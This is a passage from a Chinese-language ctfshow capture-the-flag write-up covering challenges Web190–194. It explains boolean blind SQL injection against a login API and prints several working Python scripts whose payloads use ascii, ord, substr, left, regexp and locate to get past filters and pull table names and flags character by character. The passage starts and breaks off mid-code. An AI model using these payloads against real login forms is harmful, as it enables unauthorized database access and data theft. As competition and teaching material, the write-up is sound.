class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>这样可以直接把index.php读出来：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-11-01 14:21:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-11-08 14:35:46</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;ctfshow&#123;018b4494-0f9a-4fc3-8ab4-8aeea7d4f59d&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ua</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sqlmap/i&#x27;</span>, <span class="variable">$ua</span>))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="keyword">array</span>(<span class="string">&quot;sqlmap&quot;</span>)));<span class="comment">#中文乱码</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$ret</span> = <span class="keyword">array</span>(</span><br><span class="line">		<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;&quot;</span>,<span class="comment">#中文乱码</span></span><br><span class="line">		<span class="string">&quot;count&quot;</span>=&gt;<span class="number">0</span>,</span><br><span class="line">		<span class="string">&quot;data&quot;</span>=&gt;<span class="keyword">array</span>()</span><br><span class="line">	);</span><br></pre></td></tr></table></figure>
<p>结束~</p>
<h2 id="Web190（布尔盲注）"><a href="#Web190（布尔盲注）" class="headerlink" title="Web190（布尔盲注）"></a>Web190（布尔盲注）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923025826-97ca64fd-312d-4814-86fe-abe8c3aa9579.png#averageHue=%23f6f6f6&clientId=udddb62e8-82cd-4&from=paste&height=677&id=ube8ed830&name=image.png&originHeight=846&originWidth=1355&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49230&status=done&style=none&taskId=u713835b1-8199-47e9-bb48-02071caac80&title=&width=1084" alt="image.png"><br>这里输入username&#x3D;0,password&#x3D;0会提示没有该用户，原因是什么？<br>注意’{$username}’这次加了，做个简单测试：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923212564-a14c258b-b340-472d-9481-f1128fdaf7fc.png#averageHue=%23fbfbfa&clientId=udddb62e8-82cd-4&from=paste&height=588&id=u91525e03&name=image.png&originHeight=735&originWidth=505&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46717&status=done&style=none&taskId=u4d949efc-df24-469d-add3-927b9e26970&title=&width=404" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923218077-91532d4a-0c78-4c10-bf64-5cc9569b48d7.png#averageHue=%23fbfbfb&clientId=udddb62e8-82cd-4&from=paste&height=427&id=ue8a6cdd7&name=image.png&originHeight=534&originWidth=520&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34294&status=done&style=none&taskId=u2aea4712-a4b1-4ff5-a6f6-4282e797d10&title=&width=416" alt="image.png"><br>0和‘0’的意义是不一样的！<br>后来经过测试，发现username&#x3D;admin时提示，密码错误，也就是说有这个用户名，以此为根据写个脚本（自己第一次写脚本QWQ）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://143741ab-1a01-4c02-b763-04ed35430470.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    head=<span class="number">1</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment"># &quot;username&quot;: f&quot;admin&#x27; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        <span class="comment"># &quot;username&quot;: f&quot;admin&#x27; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0)#&quot;</span></span><br><span class="line">        data=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27; and if(ascii(substr((select group_concat(f1ag) from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span>,</span><br><span class="line">              <span class="string">&quot;password&quot;</span>:<span class="number">0</span>&#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;u8bef&#x27;</span> <span class="keyword">in</span> r.text:<span class="comment">#存在用户名的话就会显示密码错误</span></span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head!=<span class="number">1</span>:</span><br><span class="line">        flag=flag+<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>简简单单的二分法，经过测试，二分法的速度比一般的盲注快一万倍<br>接下来的流程就是，爆表》》爆列》》爆字段<br>这里注意他妈的是f1ag不是flag！！！！！<br>![P[[3%8<code>_OB~9]65X~[Q14OC.png](https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923340476-0b978fe4-8821-4426-aecb-903dad0465a8.png#averageHue=%232d2d2c&amp;clientId=udddb62e8-82cd-4&amp;from=paste&amp;height=133&amp;id=u98a1e2f3&amp;name=P%5B%5B3%258%60_OB~9%5D65X~%5BQ14OC.png&amp;originHeight=166&amp;originWidth=501&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=12074&amp;status=done&amp;style=none&amp;taskId=u7e8b144a-4037-482e-81dd-5155c19c244&amp;title=&amp;width=400.8)![WG0991PVK4R</code>GM&#96;{CE2X8WI.png](<a target="_blank" rel="noopener" href="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923342733-2934b5a2-8b86-4534-bf73-3bb7f24e9dd6.png#averageHue=%232d2c2c&amp;clientId=udddb62e8-82cd-4&amp;from=paste&amp;height=130&amp;id=u8b4a1b20&amp;name=WG0991PVK4R%60GM%60%7BCE2X8WI.png&amp;originHeight=162&amp;originWidth=384&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9018&amp;status=done&amp;style=none&amp;taskId=u558b1cf0-b283-4929-9b73-87d67e350b8&amp;title=&amp;width=307.2">https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923342733-2934b5a2-8b86-4534-bf73-3bb7f24e9dd6.png#averageHue=%232d2c2c&amp;clientId=udddb62e8-82cd-4&amp;from=paste&amp;height=130&amp;id=u8b4a1b20&amp;name=WG0991PVK4R%60GM%60%7BCE2X8WI.png&amp;originHeight=162&amp;originWidth=384&amp;originalType=binary&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;size=9018&amp;status=done&amp;style=none&amp;taskId=u558b1cf0-b283-4929-9b73-87d67e350b8&amp;title=&amp;width=307.2</a>)<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663923347730-f257c922-d528-46c5-be8f-55d5c998cc61.png#averageHue=%232d2d2c&clientId=udddb62e8-82cd-4&from=paste&height=95&id=u2c2dd2de&name=image.png&originHeight=119&originWidth=630&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11104&status=done&style=none&taskId=u09db3408-ff0e-4814-b54f-5cef9219201&title=&width=504" alt="image.png"></p>
<h2 id="Web191（布尔盲注）"><a href="#Web191（布尔盲注）" class="headerlink" title="Web191（布尔盲注）"></a>Web191（布尔盲注）</h2><p>过滤了ascii函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:Boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&#x27;http://1945fb15-4157-463d-8f19-a489eabc0e11.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">s=string.digits+string.ascii_lowercase+string.ascii_uppercase+<span class="string">&quot;&#123;_-&#125;&quot;</span><span class="comment">#生成数字+小写字母，再加上&#123;,_,-,&#125;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment"># &quot;username&quot;: f&quot;admin&#x27; and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;,1,0)#&quot;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">f&quot;admin&#x27; and if(substr((select f1ag from ctfshow_fl0g),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;j&#125;</span>&#x27;,1,0)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">if</span> j.islower() <span class="keyword">or</span> j==<span class="string">&#x27;-&#x27;</span> <span class="keyword">or</span> j.isnumeric() <span class="keyword">or</span> j==<span class="string">&#x27;&#123;&#x27;</span> <span class="keyword">or</span> j==<span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                flag=flag+j</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>这是我写的脚本，可是我似乎忽略了这一题还是可以用二分法的。。</p>
<ul>
<li>ord():类似于ascii用于取得字符串最左边一个字符的ascii码：</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663925374424-239e66d3-82db-49a6-ae94-aa32037521b2.png#averageHue=%23fcfcfc&clientId=udddb62e8-82cd-4&from=paste&height=478&id=u9c24c2f7&name=image.png&originHeight=598&originWidth=432&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29496&status=done&style=none&taskId=u87a1c89d-8644-4388-a9d6-1d5c9d4d977&title=&width=345.6" alt="image.png"><br>二分法脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://1945fb15-4157-463d-8f19-a489eabc0e11.challenge.ctf.show/api/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">1</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;admin&#x27; and if(ord(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,0)#&quot;</span></span><br><span class="line">            , <span class="string">&quot;password&quot;</span>: <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;u8bef&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head !=<span class="number">1</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>二分法的脚本往往是最快的，因为判断的东西很简单，会快特别多</p>
<h2 id="Web192（同上）"><a href="#Web192（同上）" class="headerlink" title="Web192（同上）"></a>Web192（同上）</h2><p>用上面的脚本1可以跑出来，ban了ord的话<br>或者<br>用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># @Author:Y4tacker</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2c0073f7-8662-4a12-a742-f17e1818ed0a.chall.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=<span class="string">&quot; _&#123;&#125;-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">z = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if((select group_concat(f1ag) from ctfshow_fl0g)regexp(&#x27;<span class="subst">&#123;j&#125;</span>&#x27;),1,2)=&#x27;1&quot;</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Web193（继续过滤）"><a href="#Web193（继续过滤）" class="headerlink" title="Web193（继续过滤）"></a>Web193（继续过滤）</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663955278540-fd3b4abe-2954-47f1-bf2e-7495a0a13509.png#averageHue=%23f5f5f5&clientId=u474e0e9d-a309-4&from=paste&height=557&id=u7001a64d&name=image.png&originHeight=696&originWidth=1073&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45177&status=done&style=none&taskId=uef1ef225-99f7-4903-bdb8-03325013fd4&title=&width=858.4" alt="image.png"><br>这次把substr和ascii，ord给ban掉了，没办法了吗？<br>不存在的！用left函数</p>
<ul>
<li>left：<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1663955363925-b5d9e49a-76c7-47a4-9d53-2b12f5d1e9f4.png#averageHue=%23faf8f7&clientId=u474e0e9d-a309-4&from=paste&height=694&id=u430e6223&name=image.png&originHeight=867&originWidth=930&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76088&status=done&style=none&taskId=u18b5f2ab-fef5-416f-a0b2-221b05feb68&title=&width=744" alt="image.png"></li>
</ul>
<p>利用这个函数写个脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:boogipop</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ee494e46-1db2-43d2-8044-721542ebc175.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=string.ascii_lowercase + string.digits+<span class="string">&quot; _&#123;&#125;-,&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        flag+=j</span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;flag&#125;&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flxg&#x27;),&#123;i&#125;)=&#x27;&#123;flag&#125;&#x27;,1,2)=&#x27;1&quot;</span></span><br><span class="line">        payload = <span class="string">f&quot;admin&#x27; and if(left((select group_concat(f1ag) from ctfshow_flxg),<span class="subst">&#123;i&#125;</span>)=&#x27;<span class="subst">&#123;flag&#125;</span>&#x27;,1,2)=&#x27;1&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag=flag[:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>还有就是虽然也可以试着用locate函数，但是这个没有顺序截取的，他只是判断是否有字符串存在，所以这个只是个比较巧的题，也可以用locate得出答案，但这是纯运气问题</p>
<h2 id="Web194（继续过滤）"><a href="#Web194（继续过滤）" class="headerlink" title="Web194（继续过滤）"></a>Web194（继续过滤）</h2><p>一如既往老兄<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664037915798-bb0dcf9d-2a95-4252-9f05-f26903fba75c.png#averageHue=%23f3f2f2&clientId=ua75a4812-b2b1-4&from=paste&height=434&id=u352e3e81&name=image.png&originHeight=542&originWidth=1516&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25074&status=done&style=none&taskId=u9cbef4c9-3d23-49b6-945e-b23360ccded&title=&width=1212.8" alt="image.png"><br>多ban了left和right，真的就是作对啊，咱们用regexp和locate<br>locate这边可能有时候就会有点运气成分，所以locate用来读表和列<br>regexp用来精确读取flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://da6bfd3e-4158-4de3-83dc-40f1b95d44d3.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr=string.ascii_lowercase + string.digits+<span class="string">&quot; _&#123;&#125;-,&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> flagstr:</span><br><span class="line">        flag+=j</span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(locate(&#x27;&#123;flag&#125;&#x27;,(select group_concat(f1ag) from ctfshow_flxg)),1,2)=&#x27;1&quot;</span></span><br><span class="line">        payload=<span class="string">f&quot;admin&#x27; and if((select f1ag from ctfshow_flxg)regexp(&#x27;ctfshow<span class="subst">&#123;flag&#125;</span>&#x27;),1,0)#&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(right((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;)=&#x27;&#123;flag&#125;&#x27;,1,2)=&#x27;1&quot;</span></span><br><span class="line">        <span class="comment"># payload = f&quot;admin&#x27; and if(right((select group_concat(f1ag) from ctfshow_flxg),&#123;i&#125;)=&#x27;&#123;flag&#125;&#x27;,1,2)=&#x27;1&quot;</span></span><br><span class="line"></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> == r.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> == j:</span><br><span class="line">                exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag=flag[:-<span class="number">1</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>或者跑二分法脚本，我怎么没想到啊？<br>‘a’&gt;’c’这也是用ascii码比较的，所以ascii就多此一举了好吗沃日</p>
<ul>
<li>mid：和substr作用一样</li>
</ul>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664039424158-9b6ea1f3-38eb-4926-8825-6743e53425cf.png#averageHue=%23f8f8f8&clientId=ua75a4812-b2b1-4&from=paste&height=597&id=uc6e5b208&name=image.png&originHeight=746&originWidth=1467&originalType=binary&ratio=1&rotation=0&showTitle=false&size=52617&status=done&style=none&taskId=u31229c24-43c8-4605-a4ca-5b83a7e2865&title=&width=1173.6" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1664039432480-ca6ba19a-a625-41d0-91fe-cb9890d405b3.png#averageHue=%23f3f3f2&clientId=ua75a4812-b2b1-4&from=paste&height=91&id=u39a3161b&name=image.png&originHeight=114&originWidth=1916&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21028&status=done&style=none&taskId=u9e831130-3049-406f-baeb-f937477a96f&title=&width=1532.8" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://da6bfd3e-4158-4de3-83dc-40f1b95d44d3.challenge.ctf.show/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow&#123;flxg,ctfshow&#123;user</span></span><br><span class="line"><span class="comment"># payload = &quot;0&#x27; or if(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;,1,0) -- &quot;</span></span><br><span class="line"><span class="comment"># 列名 